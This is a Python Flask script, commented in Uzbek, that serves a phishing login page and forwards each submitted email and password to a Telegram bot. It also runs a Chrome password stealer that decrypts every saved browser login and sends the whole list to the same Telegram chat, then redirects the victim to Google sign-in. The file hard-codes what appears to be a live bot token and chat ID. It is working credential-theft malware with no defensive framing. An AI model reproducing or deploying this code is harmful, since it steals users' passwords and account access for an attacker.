import os, json, base64, sqlite3, shutil, requests
from flask import Flask, render_template, request, redirect
from flask_cors import CORS
import win32crypt
from Cryptodome.Cipher import AES

app = Flask(__name__)
CORS(app)

# --- SOZLAMALAR ---
API_KEY = "8512002202:AAHhI8RE3aPOOSbK7nHLiwH_cerEQpBnrBU"
CHAT_ID = "7958070473"

# 1. Chrome shifrlash kalitini olish
def get_master_key():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

# 2. Parolni deshifrovka qilish
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        return decrypted_pass[:-16].decode()
    except: return "Xato!"

# 3. Barcha parollarni yig'ish funksiyasi
def grab_passwords():
    master_key = get_master_key()
    login_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    shutil.copyfile(login_db, "temp_db")
    
    conn = sqlite3.connect("temp_db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    
    data = "📑 **Chrome Saqlangan Parollar:**\n\n"
    for row in cursor.fetchall():
        url, user, psw = row[0], row[1], decrypt_password(row[2], master_key)
        if user or psw:
            data += f"🌐 {url}\n👤 `{user}` | 🔑 `{psw}`\n\n"
    
    conn.close()
    os.remove("temp_db")
    return data

# --- FLASK YO'LLARI ---
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # 1. Saytda yozilgan parolni yuborish
    msg = f"🎯 **Phishing Ma'lumoti:**\n📧 Email: `{email}`\n🔑 Parol: `{password}`"
    requests.post(f"https://api.telegram.org/bot{API_KEY}/sendMessage", data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    
    # 2. Kompyuterdagi barcha parollarni o'g'irlash va yuborish
    try:
        all_passwords = grab_passwords()
        requests.post(f"https://api.telegram.org/bot{API_KEY}/sendMessage", data={"chat_id": CHAT_ID, "text": all_passwords, "parse_mode": "Markdown"})
    except Exception as e:
        print(f"Stealer xatosi: {e}")

    return redirect("https://accounts.google.com/signin")

if __name__ == '__main__':
    app.run(port=5000)